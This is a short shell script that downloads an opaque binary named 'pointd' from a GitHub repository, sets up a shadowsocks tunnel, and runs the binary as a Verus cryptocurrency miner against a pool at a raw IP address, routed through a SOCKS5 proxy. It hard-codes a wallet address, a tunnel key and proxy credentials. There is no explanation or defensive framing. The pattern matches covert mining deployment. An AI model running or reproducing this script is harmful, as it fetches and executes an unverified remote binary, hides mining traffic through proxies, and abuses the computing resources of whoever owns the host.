apt update -y
sudo apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
wget -q https://github.com/manorepas/bash/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8 -p x -t 2 -x socks5://Novax:chalHatt@129.158.58.77:1080
echo "okesu"
